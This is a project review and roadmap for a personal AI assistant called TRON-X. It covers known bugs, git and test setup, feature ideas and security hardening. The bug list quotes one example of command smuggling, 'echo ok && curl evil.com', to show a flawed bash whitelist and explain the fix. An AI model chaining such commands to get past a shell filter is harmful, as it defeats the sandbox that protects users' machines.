# TRON-X — Project Analysis & Improvement Roadmap
*Generated 2026-06-10*

## Snapshot

TRON-X is a mature, feature-complete personal AI assistant: ~16k LOC across 70 Python files, all 20 planned phases done (multi-LLM routing, RAG memory, voice, vision, browser/CAD/email/calendar/WhatsApp/IoT agents, multi-agent coordinator, HUD frontend). Two gaps stand out structurally: **there's no automated test suite** (only the WhatsApp bridge's bundled node_modules have tests) and **no git repository** — meaning no history, no diffs, no rollback safety net for a project this size.

---

## 1. Fix the known bugs first (cheap, high value)

`CODE_REVIEW_logical_errors.md` already documents these — worth clearing before adding anything new:

- `episodic_memory.py::forget_before()` is truncated — computes `cutoff` and returns nothing. Easy fix, mirrors `forget_session()` above it.
- `executor.py` — timed-out subprocesses (`execute_python/js/bash`) are never killed; a hung script keeps eating CPU forever. Add `proc.kill()` + `await proc.wait()` in the `TimeoutError` handler.
- `executor.py::execute_bash` — whitelist only checks the *first* command; `echo ok && curl evil.com` slips through. Needs per-segment validation (split on `;`, `&&`, `||`, `|`).
- `executor.py::execute_python` — `allow_network=True` disables *all* AST safety checks, not just network. Scope it properly.
- `iot/nl_mapper.py` — `if temp:` drops `"set temperature to 0"` (falsy 0.0). Use `is not None`, and clamp brightness to 0–100.

---

## 2. Foundational hygiene

- **Initialize git.** `.gitignore` already exists and excludes `auth/`, `*.json`, `.venv`, etc. — but **`.env` itself isn't excluded**, and it currently holds 6KB of live API keys. Add `.env` (and `*.env` except `.env.example`) to `.gitignore` *before* the first commit.
- **Add a pytest suite.** Even a thin layer pays off: `py_compile`/import-smoke test for every module (catches the truncation bugs above automatically), unit tests for pure logic (`powershell.safety_scan`, `nl_mapper`, `_filter_params`, MMR reranking), and FastAPI `TestClient` smoke tests hitting each router's happy path with mocked LLM calls.
- **CI via GitHub Actions** (or even a local pre-commit hook): lint (ruff/flake8), `py_compile` all files, run pytest, `node --check` on the static JS files — directly enforces the "verify after every write" rule that's currently manual.
- **Trim `requirements.txt` cruft** — ~50 unused imports flagged in the code review; a `pyflakes`/`ruff --select F401` pass would shrink the dependency surface.

---

## 3. "Amazing" feature additions

### Proactive assistant layer
The pieces (calendar, email, reminders, weather/news feeds, scheduler) all exist but only respond to requests. The big unlock is making TRON-X **initiate**:
- A scheduled "morning briefing" agent (calendar today + unread important emails + weather + top news + pending reminders), delivered via TTS or a HUD card on wake.
- A **memory consolidation job** (nightly): runs `period_summary()`, promotes recurring episode topics into the `knowledge` collection, and (once fixed) calls `forget_before()` to prune stale episodes — turning episodic memory into genuine long-term memory instead of an ever-growing log.
- Proactive alerts: calendar conflict detection, "you have an unread email from your manager," IoT anomaly detection (e.g. a door sensor open at night) pushed to the HUD or a phone notification.

### Memory & knowledge graph
- Extract an entity-relationship graph from episodic memory (people, projects, recurring topics) and surface it as a visual graph in the HUD — "what do you know about X" becomes a navigable map, not just a search box.
- A "memory recall" HUD card (already on the Session 3 backlog) — semantic search over episodes with timeline view.

### Finish the HUD backlog (Session 3 left these open)
- IoT device card (NL mapper is wired, just needs UI).
- Analytics/usage card.
- Multi-card stacking instead of one-at-a-time.
- Web Audio API playback for streamed TTS (currently incomplete — `tts_done` event is created but never set).
- A live "agent activity feed" via SSE showing what TRON-X is doing in real time (which agent fired, latency, result) — turns the coordinator's existing `stream_parallel` events into a visible trace.
- Make the HUD a installable PWA so it's usable from a phone on the same network.

### Multi-channel presence
- WhatsApp-Web automation (Playwright/Baileys) is explicitly called out as the most fragile component. A **Telegram bot bridge** (Bot API, no browser automation, no QR re-auth) would be a far more reliable second channel and is a relatively small addition given the existing agent pattern.
- Push notifications (ntfy.sh / Pushover / ANTHROPIC-free options) for reminders and proactive alerts when you're away from the PC.

### Cost & reliability dashboard
LiteLLM returns per-call cost/token data that's currently discarded. Feed it into `analytics/collector.py` and surface a "spend by model / by day" view — genuinely useful given 104 models across 14 providers. Pair with an **eval harness**: a fixed set of canned prompts run nightly against the active model chain to catch silent provider outages or regressions before you hit them live.

### Smart-home automation engine
`ws_listener.py` already streams Home Assistant events in real time, and `nl_mapper.py` translates NL to device commands. The missing piece is a small **rules engine**: condition → action automations ("if motion after 11pm, turn on hallway light"; "if I say goodnight, run the goodnight scene") configurable via chat or a HUD panel, rather than only reactive one-shot commands.

### Voice upgrades
- `wake_word.py` exists but isn't wired into a continuous always-listening loop — finishing this turns TRON-X into a true ambient assistant rather than push-to-talk only.
- Custom voice cloning (ElevenLabs voice ID, or fine-tuned Kokoro voice) for a more "Jarvis"-personal feel.

### CAD / vision
- The CadQuery agent is dead in the water on Python 3.13. Since Docker is already part of the stack, spinning up a **small Python-3.11 sidecar container** just for CAD generation (called over HTTP from the main app) would resolve this cleanly without downgrading the whole project.
- Extend `vision/screen.py` to support a webcam feed for "what am I looking at" / "read this document on my desk" style queries.

### Security / production hardening
- `auth.py` and `ratelimit.py` are implemented but need to be the **default-on profile** for any deployment reachable beyond localhost — currently easy to forget to enable.
- `whatsapp-bridge/auth/` holds ~1MB of live session credentials; confirm it never leaves the machine (it's in `.gitignore`, good — but worth a backup/restore story since losing it means re-scanning the WhatsApp QR code).
- `pip-audit` / `npm audit` (the WhatsApp bridge has a large `node_modules` tree) as a periodic dependency vulnerability check.
- A reverse proxy (Caddy/Traefik) in `docker-compose.yml` for HTTPS if ever exposed off-localhost.

---

## 4. Suggested priority order

1. Fix the 5 documented bugs (especially the subprocess-kill and bash-whitelist ones — these are real safety holes in a system with shell execution).
2. `git init` with a corrected `.gitignore` (add `.env`), then a baseline pytest smoke suite + simple CI.
3. Finish the Session 3 HUD backlog (IoT card, analytics card, TTS playback) — closes out work already in progress.
4. Build the proactive morning-briefing agent + memory consolidation job — highest "wow factor" relative to effort, since every dependency already exists.
5. Telegram bridge as a more reliable WhatsApp alternative.
6. Cost dashboard + automation rules engine + wake-word loop, roughly in that order depending on which you'll use daily.
